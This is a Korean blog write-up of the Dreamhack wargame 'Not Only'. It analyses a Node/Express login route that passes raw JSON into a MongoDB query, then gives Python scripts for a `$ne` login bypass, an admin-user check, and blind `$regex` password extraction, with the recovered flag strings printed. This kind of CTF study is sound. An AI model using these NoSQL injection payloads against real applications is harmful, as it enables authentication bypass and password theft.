---
title: "드림핵 lv.2 - Not Only"
date: 2025-02-22 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, NoSQL Injection, Blind NoSQL Injection] 
description: 드림핵 Not Only 웹해킹 워게임 풀이
---

[Dreamhack Not-only Wargame](https://dreamhack.io/wargame/challenges/1619)
# 문제 설명
---
admin 권한을 가진 유저를 찾으세요! 유저의 password 가 플래그입니다. 패스워드 형식은 숫자와 알파벳 대소문자, 특수문자 `{`, `}`가 포함된 문자열입니다.

admin 유저는 몇 명일까요?

플래그 형식은 `DH{}` 입니다.

# 기본 정보 파악하기
## 웹사이트 분석
### /
![not only main](https://1drv.ms/i/c/5cb37aa515b56a00/IQSM96MhhPjsQ5ZOUPJBE9HSAenEtaSNKwRRd_AZa7GKZLc?width=660)<br />
드림핵에서 제공하는 virtual 서버를 실행하여 접속해주면 메인 화면이 보인다. <br />
***"Welcome. Please Login."*** 이라는 문구로 유저를 맞이하고 있다. 아마도 admin 계정으로 접속에 성공하면 이 부분에 FLAG가 나오지 않을까 짐작해볼 수 있다(나중에 보면 알겠지만 그렇지 않다, 문제를 잘 읽어보자).
### /login
![not only login](https://1drv.ms/i/c/5cb37aa515b56a00/IQQbV0DXE2vLQaj94k177yNaATLGhnIXX3sfSTtN9kFVGAU?width=660) <br />
로그인 창에서도 특별한 점을 찾을 수가 없다. 단순 username과 password를 받아줄 2개의 인풋 박스가 있고 로그인 버튼이 있을 뿐이다. <br />
버튼을 누르면 /login 엔드 포인트로 uid(username), upw(password) 정보와 함께 POST 요청을 보낸다.
## 코드 분석
### app.js
```javascript
// app.js
const express = require('express');
const app = express();
const path = require('path');
const port = 3000;
const loginRouter = require('./routes/login'); 
const userRouter = require('./routes/user'); 
const session = require('express-session');

app.use(session({
  secret: 'REDACTED',
  resave: false,
  saveUninitialized: true
}));


app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.set('view engine','ejs')
app.set('views', path.join(__dirname, 'views')); 


app.get('/', (req, res) => {
  res.render("index.ejs");
});


app.use('/login', loginRouter);


app.use('/user', userRouter);

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
})
```
문제에서 제공하는 코드에서 가장 기본이 되는 app.js를 살펴보면 express를 이용해서 서버를 구동하는 것이 보인다.

End Point로는 `/`, `/login`, `/user`이 있고 router 함수를 통해 HTTP 요청을 처리하고 있다.
### Routers
#### loginRouter
```javascript
// login.js
const express = require('express');
const router = express.Router();
const path = require('path');

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

router.post('/', (req, res) => {
    const uid = req.body.uid;
    const upw = req.body.upw;
    
    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            req.session.user = { uid: result['uid'], admin: result['admin']}; 
            res.redirect('/user');
        }else{
            res.redirect('/login');
        }
    });
  });

router.get('/', function(req, res) {
    res.render("login.ejs");
});

module.exports = router;
```
login.js를 보면 해당 서버는 mongoDB를 이용해서 유저들의 정보를 다루는 것으로 보인다.<br />
해당 라우터의 POST 요청 처리 함수를 보면 알 수 있듯이 역시나 유저로부터 uid, upw를 받아서 해당 정보와 일치하는 유저를 하나 찾아 /user 엔드 포인트로 redirection이 발생한다.
#### userRouter
```javascript
const express = require('express');
const router = express.Router();


router.get('/', (req, res) => {
  const user = req.session.user; 

  if (user) {
    res.render('user', { user: user }); 
  } else {
    res.redirect('/login'); 
  }
});

module.exports = router;
```
login 화면에서 로그인에 성공하면 session을 설정한 후 /user로 이동시킨다. session으로 들어간 정보들은 /user 화면에서 출력된다(user.ejs를 참고하면 알 수 있다).

결론적으로, 로그인에 성공하면 /user 화면에서 유저의 정보를 볼 수 있다. 
## 취약점 분석
```javascript
// login.js
router.post('/', (req, res) => {
    const uid = req.body.uid;
    const upw = req.body.upw;
    
    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            req.session.user = { uid: result['uid'], admin: result['admin']}; 
            res.redirect('/user');
        }else{
            res.redirect('/login');
        }
    });
});
```
login.js의 POST 요청 처리 함수에서 mongoDB 쿼리를 하기 전에 요청으로 들어온 데이터를 필터링하지 않는다는 점에서 공격이 발생할 수 있다. **NoSQL Injection**이 가능하다는 의미이다.
### 공격 방법
![[non_only_login.png]]
우선 테스트도 할 겸 로그인 창의 인풋 박스에 각각 `{ "$ne": "1" }`을 입력해봐도 아무런 응답이 없다.<br />
POST 요청의 body 데이터에 해당 mongoDB 쿼리를 넣어줘야 하는데 아마도 이게 스트링으로 인식이 돼(당연하게도) 일반적인 방법으로는 작동하지 않는다. <br />
게다가 만일 이러한 방식이 성공한다고 하더라도 우리는 출제자가 원하는 것을 얻을 수가 없다. 문제를 잘 읽어보면 유저의 **password가 FLAG**라는 것을 알 수 있다. 그렇기 때문에 이렇게 로그인을 우회하는 방식으로는 플래그를 얻을 수가 없다.

그렇다면 어차피 Blind NoSQL Injection 공격을 시도도 할 겸, 로그인 테스트 또한 python으로 진행하면 된다.
#### Login 테스트

```python
import requests

url = "http://host1.dreamhack.games:18962//login"

body_data = {
    "uid": "admin",
    "upw": { "$ne": 1 }
}

resp = requests.post(url, json=body_data)
print(resp.text)
```
```
// result
...
<div class="container mt-5">
  
    <h1>Welcome, admin</h1>
    <p>Your username: admin</p>
    <p>Your admin auth: 0</p>
  
</div>
...
```
body_data에 NoSQL Injection에 쓰일 쿼리를 넣어주고 POST 요청을 보내는 코드이다. 요청을 보내고 돌아오는 응답 HTML을 보면 중간에 로그인에 성공했을 때 뜨는 태그들이 보인다. <br />
예상대로 NoSQL Injection이 작동한다는 것을 알 수 있게 됐다. 
#### Blind NoSQL Injection 코드
코드를 작성하기 이전에 고려해야할 부분들이 몇가지 있다. 
1. admin 권한을 가진 유저가 누구인지(username이 무엇인지) 알 수 없음.
	그러므로 존재하는 유저 한 명 한 명을 대상으로 인젝션을 시도해야한다.
2. 비밀번호는 영어 대소문자 + 숫자 + '{' + '}'로 이루어져 있다.

##### 어떤 유저가 admin 권한이 있는지 확인하기
```python
import requests
import string
import re

url = "http://host1.dreamhack.games:9852//login"
usernames = ["hack", "apple", "melon", "testuser", "admin", "aaaa", "cream", "berry", "ice", "panda"]

for username in usernames:

    # checking if a user has auth 1
    body_data = { "uid": username, "upw": { "$ne": 1 } }
    resp = requests.post(url, json=body_data)
    match = re.search(r"Your admin auth: (\d+)", resp.text)
    if match:
        admin_auth = match.group(1)  # getting the authentication number
    if admin_auth == '0':
        print(f"{username} has no authentication..")
    else:
        print(f"{username} has authentication!")
```
```
// result
hack has no authentication..
apple has no authentication..
melon has no authentication..
testuser has authentication!
admin has no authentication..
aaaa has no authentication..
cream has authentication!
berry has no authentication..
ice has no authentication..
panda has no authentication..
```
`testuser`와 `cream`이라는 유저가 admin 권한이 있다는 것을 알아냈다.<br />
해당 코드에서 유저들의 이름을 담은 string array를 사용하고 있는데 이름의 리스트는 문제에서 제공하는 파일 중 `db.sql`에 들어있다.
##### testuser와 cream의 비밀번호 구하기
```python
import requests
import string

url = "http://host1.dreamhack.games:14265//login"
usernames = ["testuser", "cream"]
ALPHANUMERIC = string.ascii_letters + string.digits + "{}"

for username in usernames:
    base_str = ""
    while True:
        is_new_found = False

        for c in ALPHANUMERIC:
            pw = base_str +  c

            # sending POST requests and getting the authentication
            body_data = {
                "uid": username,
                "upw": { "$regex": f"^{pw}" }
            }
            resp = requests.post(url, json=body_data)

            if "Welcome, " in resp.text:
                is_new_found = True
                base_str = pw
                print(base_str)
                break

        if not is_new_found:
            print(f"{username}'s password is {pw}")
            break
```
```
// result
D
DH
DH{
DH{0
DH{0d
DH{0da
DH{0da0
DH{0da0d
DH{0da0d8
DH{0da0d81
DH{0da0d81e
DH{0da0d81e5
DH{0da0d81e54
DH{0da0d81e54f
DH{0da0d81e54f5
DH{0da0d81e54f57
DH{0da0d81e54f57b
testuser's password is DH{0da0d81e54f57b}
e
e1
e1b
e1b6
e1b67
e1b67f
e1b67f0
e1b67f0e
e1b67f0e6
e1b67f0e66
e1b67f0e666
e1b67f0e666e
e1b67f0e666e3
e1b67f0e666e32
e1b67f0e666e326
e1b67f0e666e3269
e1b67f0e666e32695
e1b67f0e666e326954
e1b67f0e666e326954}
cream's password is e1b67f0e666e326954}}
```
testuser와 cream의 비밀번호를 알아내는 코드이다. 각 유저의 비밀번호 길이를 먼저 알아내면 더 좋았겠지만 그냥 무한 루프를 돌아도 괜찮을 것 같아서 그렇게 진행했다.<br />

결과값이 조금 지저분한데 이렇게 한 이유는 매번 POST 요청을 글자마다 보내고 있어서 비밀번호 추출 시간이 꽤나 걸리기 때문이다. 그래서 비밀번호를 알아낼 때마다 업데이트된 문자열을 계속 출력해줘서 제대로 작동하고 있는지 중간중간 확인하는 용도이다.<br />

###### 착각한 부분
문제 설명을 보면 비밀번호는 영어 대소문자와 숫자 그리고 {, }로 이루어져 있다고 했고 플래그 형식은 DH{}라고 명시돼있다. 그런데 이것을 보고 비밀번호는 반드시 DH{randomflag} 형식이겠구나 라고 생각하여 정규식을 `"^DH{" + f"{pw}"`로 설정한 것이 잘못됐다.
그래서 결국 "DH{"로 시작하는 testuser의 비밀번호는 알아낼 수 있었지만 cream의 비밀번호는 "DH{"로 시작하지 않아서 제대로 작동하지 않았다.
### 플래그
이제 문제에서 요구하는 정보는 모두 얻었지만 정작 진짜 플래그가 무엇인지는 확실하게 알아낼 수 없다.<br />
testuser와 cream의 비밀번호를 이 방법 저 방법 입력해보면 어느 순간 맞는 플래그를 찾을 수 있게된다.